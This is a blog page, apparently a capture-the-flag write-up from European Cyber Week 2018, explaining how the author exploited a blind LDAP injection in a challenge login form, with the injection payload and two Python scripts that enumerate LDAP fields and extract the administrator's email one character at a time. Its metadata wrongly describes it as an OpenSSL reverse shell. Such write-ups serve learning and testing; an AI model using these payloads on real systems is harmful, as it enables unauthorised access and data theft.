@@ -1,0 +1,144 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[European Cyber Week] - AdmYSion - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Simple reverse shell using OpenSSL."><meta property="og:title" content="[European Cyber Week] - AdmYSion"><meta property="og:description" content="Simple reverse shell using OpenSSL."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/ecw2018admyssion/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-10-22T21:57:40+08:00"><meta property="article:modified_time" content="2018-10-22T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[European Cyber Week] - AdmYSion"><meta name=twitter:description content="Simple reverse shell using OpenSSL."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/ecw2018admyssion/><link rel=prev href=maki.bzh/writeups/ecw2018chatbot/><link rel=next href=maki.bzh/writeups/santhacklaus2018netrunner/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[European Cyber Week] - AdmYSion","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/ecw2018admyssion\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"ecw, thales, airbus, ldap injection, web, blind","wordcount":451,"url":"maki.bzh\/writeups\/ecw2018admyssion\/","datePublished":"2018-10-22T21:57:40+08:00","dateModified":"2018-10-22T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":"Simple reverse shell using OpenSSL."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[European Cyber Week] - AdmYSion</h1><div class=content id=content><h2 id=state-of-the-art>State of the art</h2><p>We only have a login form in front of us:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_ecw/admysion/adm_1.png data-srcset="/lib/images/writeups/2018_ecw/admysion/adm_1.png, /lib/images/writeups/2018_ecw/admysion/adm_1.png 1.5x, /lib/images/writeups/2018_ecw/admysion/adm_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_ecw/admysion/adm_1.png title=/lib/images/writeups/2018_ecw/admysion/adm_1.png></p><p>My first move was trying an SQL injection&mldr; It was useless, in fact it&rsquo;s an <code>LDAP injection</code>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_ecw/admysion/adm_2.png data-srcset="/lib/images/writeups/2018_ecw/admysion/adm_2.png, /lib/images/writeups/2018_ecw/admysion/adm_2.png 1.5x, /lib/images/writeups/2018_ecw/admysion/adm_2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_ecw/admysion/adm_2.png title=/lib/images/writeups/2018_ecw/admysion/adm_2.png></p><p>Our little asterisk <code>*</code> is matching with all the accounts in the LDAP base, it&rsquo;s now time to script :D</p><h2 id=blind-ldap-injection>Blind LDAP Injection</h2><p>Because I already did an LDAP injection on a famous french challenge platform (it starts by <code>root</code> and ends by <code>-me.org</code>), I know that the payload will have the following aspect</p><blockquote><p><em>)(cn=</em>))\x00</p></blockquote><p>The <code>cn</code> part will change, it&rsquo;s a common field in an LDAP base, it means <code>Common Name</code>. The null byte at the end is used to remove the password field.</p><h2 id=find-ldap-fields>Find LDAP fields</h2><p>I built a little dictionary with all the common LDAP fields:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>c
+</span></span><span class=line><span class=cl>cn
+</span></span><span class=line><span class=cl>dc
+</span></span><span class=line><span class=cl>facsimileTelephoneNumber
+</span></span><span class=line><span class=cl>co
+</span></span><span class=line><span class=cl>gn
+</span></span><span class=line><span class=cl>homePhone
+</span></span><span class=line><span class=cl>jpegPhoto
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl>l
+</span></span><span class=line><span class=cl>mail
+</span></span><span class=line><span class=cl>mobile
+</span></span><span class=line><span class=cl>o
+</span></span><span class=line><span class=cl>ou
+</span></span><span class=line><span class=cl>owner
+</span></span><span class=line><span class=cl>name
+</span></span><span class=line><span class=cl>pager
+</span></span><span class=line><span class=cl>password
+</span></span><span class=line><span class=cl>sn
+</span></span><span class=line><span class=cl>st
+</span></span><span class=line><span class=cl>uid
+</span></span><span class=line><span class=cl>username
+</span></span><span class=line><span class=cl>userPassword
+</span></span></code></pre></td></tr></table></div></div><p>And then a little python script to bruteforce them:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ava</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;https://web050-admyssion.challenge-ecw.fr/&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;dic&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>dic</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>dic</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;login&#39;</span><span class=p>:</span><span class=s1>&#39;*)(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;=*))</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>:</span><span class=s1>&#39;bla&#39;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;Error: This login is associated with&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>ava</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ava</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=looking-for-the-admin-email>looking for the admin email</h3><p>Okay, now I will dig into the <code>mail</code> field trying to find the email address of the administrator (I know my script is very, very ugly, I bruteforced manually each first letter&mldr;):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pprint</span> <span class=kn>import</span> <span class=n>pprint</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ava</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=n>partial</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>no_pass</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl><span class=n>charset</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=s1>&#39;.@&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;https://web050-admyssion.challenge-ecw.fr/&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>go</span> <span class=o>=</span> <span class=s1>&#39;Error: This login is associated&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>go2</span> <span class=o>=</span> <span class=s1>&#39;Login failed&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>nogo</span> <span class=o>=</span> <span class=s1>&#39;Account not found, please&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>no_pass</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>no_pass</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>charset</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;*)(mail=s&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>partial</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;*))</span><span class=se>\x00</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;login&#39;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>:</span><span class=s1>&#39;bla&#39;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nogo</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>no_pass</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>            <span class=n>partial</span> <span class=o>+=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>partial</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>You can notice the little <code>s</code> in front of my <em>partial</em> variable! I tried to find all <code>a</code>, <code>b</code> etc&mldr; And here is why <code>s</code>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_ecw/admysion/adm_3.png data-srcset="/lib/images/writeups/2018_ecw/admysion/adm_3.png, /lib/images/writeups/2018_ecw/admysion/adm_3.png 1.5x, /lib/images/writeups/2018_ecw/admysion/adm_3.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_ecw/admysion/adm_3.png title=/lib/images/writeups/2018_ecw/admysion/adm_3.png></p><p><code>s</code>+<code>arah.connor.admin@yoloswag.com</code> looks to be the administrator. To find the username of the account, just change <code>mail</code> field into <code>cn</code>, it gives us: <code>s.connor</code>. And now, how can we find the password? By guessing for sure! Let&rsquo;s try &lsquo;yoloswag&rsquo; as a password:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_ecw/admysion/adm_4.png data-srcset="/lib/images/writeups/2018_ecw/admysion/adm_4.png, /lib/images/writeups/2018_ecw/admysion/adm_4.png 1.5x, /lib/images/writeups/2018_ecw/admysion/adm_4.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_ecw/admysion/adm_4.png title=/lib/images/writeups/2018_ecw/admysion/adm_4.png></p></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
